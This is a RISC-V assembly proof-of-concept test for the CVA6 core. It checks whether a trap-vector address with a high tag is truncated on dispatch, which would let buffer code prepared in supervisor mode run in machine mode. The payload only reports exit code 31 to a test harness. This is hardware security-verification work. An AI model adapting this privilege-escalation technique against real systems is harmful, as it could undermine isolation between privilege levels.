/*
 * CVA6 mtvec readback / trap-dispatch security PoC
 *
 * Shape, adapted from the XiangShan XS-4 security scenario:
 *   1. M-mode installs a safe trap handler and enters S-mode.
 *   2. S-mode copies a payload into a writable low-address buffer and executes
 *      fence.i, making the low alias less-privileged prepared code.
 *   3. Control returns to M-mode by ECALL from S-mode.
 *   4. M-mode programs mtvec = HIGH_TAG | payload_buf, reads mtvec back, and
 *      only proceeds if readback preserved that high-tagged architectural
 *      target.
 *   5. M-mode takes another ECALL. A vulnerable CVA6 dispatches to the low
 *      alias of payload_buf, executing the S-prepared buffer in M-mode.
 *
 * Oracle:
 *   - 0:  mtvec was legalized on readback before the trap was armed.
 *   - 31: unauthorized low-alias payload executed in M-mode.
 *   - 41..48: harness/metadata failure paths.
 */
.option push
.option norelax
.option norvc

.equ HIGH_TAG,             0x2000000000000000
.equ MSTATUS_MPP_MASK,     0x00001800
.equ MSTATUS_MPP_S,        0x00000800
.equ PMP_RWX_NAPOT,        0x1f
.equ MCAUSE_ECALL_FROM_S,  9
.equ MCAUSE_ECALL_FROM_M, 11
.equ TOHOST_ADDR,           0x80001000

.macro EXIT code
  csrw satp, zero
  li   a0, \code
  la   t5, tohost
  slli t6, a0, 1
  ori  t6, t6, 1
  sd   t6, 0(t5)
  fence
  .word 0x0005006b
1:
  j    1b
.endm

.macro PAYLOAD_EXIT code
  csrw satp, zero
  li   a0, \code
  li   t5, TOHOST_ADDR
  slli t6, a0, 1
  ori  t6, t6, 1
  sd   t6, 0(t5)
  fence
  .word 0x0005006b
1:
  j    1b
.endm

.section .text.init, "ax"
.globl _start
_start:
  la   sp, boot_stack_top
  la   t0, m_trap
  csrw mtvec, t0
  csrw medeleg, zero
  csrw mideleg, zero
  csrw satp, zero

  /* Open physical memory so the trap-routing test is not blocked by PMP. */
  li   t0, -1
  csrw pmpaddr0, t0
  li   t0, PMP_RWX_NAPOT
  csrw pmpcfg0, t0

  /* Enter S-mode so the low-alias payload is prepared below M privilege. */
  csrr t0, mstatus
  li   t1, MSTATUS_MPP_MASK
  not  t1, t1
  and  t0, t0, t1
  li   t1, MSTATUS_MPP_S
  or   t0, t0, t1
  csrw mstatus, t0

  la   t0, s_prepare_payload
  csrw mepc, t0
  mret

  EXIT 41

.align 2
m_trap:
  csrr t0, mcause

  li   t1, MCAUSE_ECALL_FROM_S
  beq  t0, t1, handle_s_ecall

  li   t1, MCAUSE_ECALL_FROM_M
  beq  t0, t1, fail_mtrap_reentered

  li   t1, 1
  beq  t0, t1, fail_unexpected_iaccess
  li   t1, 2
  beq  t0, t1, fail_unexpected_illegal
  li   t1, 8
  beq  t0, t1, fail_unexpected_ucall
  li   t1, 12
  beq  t0, t1, fail_unexpected_ifault

  EXIT 42

handle_s_ecall:
  la   t0, payload_buf
  li   t1, HIGH_TAG
  or   t0, t0, t1
  csrw mtvec, t0

  csrr t2, mtvec
  bne  t2, t0, pass_mtvec_legalized

  /*
   * If mtvec visibly keeps the high-tagged target, the next M-mode trap must
   * honor that same architectural value. A low-alias hit means the trap
   * consumer truncated the visible target and entered the S-prepared buffer.
   */
.globl m_ecall_site
m_ecall_site:
  ecall

fail_mtrap_reentered:
  EXIT 43

fail_unexpected_ucall:
  EXIT 45

fail_unexpected_illegal:
  EXIT 46

fail_unexpected_ifault:
  EXIT 47

fail_unexpected_iaccess:
  EXIT 48

pass_mtvec_legalized:
  EXIT 0

.section .text, "ax"
.align 3
s_prepare_payload:
  la   t0, payload_template
  la   t1, payload_buf
  la   t2, payload_template_end

1:
  bgeu t0, t2, 2f
  ld   t3, 0(t0)
  sd   t3, 0(t1)
  addi t0, t0, 8
  addi t1, t1, 8
  j    1b

2:
  fence rw, rw
  fence.i
  ecall
  EXIT 44

.align 3
payload_template:
.globl unauthorized_low_alias_machine_entry
unauthorized_low_alias_machine_entry:
  PAYLOAD_EXIT 31

.align 3
payload_template_end:

.section .data, "aw"
.align 3
.globl payload_buf
payload_buf:
  .zero payload_template_end - payload_template

.align 12
boot_stack:
  .zero 4096
boot_stack_top:

.section .tohost, "aw"
.align 3
.globl tohost
tohost:
  .dword 0

.globl fromhost
fromhost:
  .dword 0

.option pop
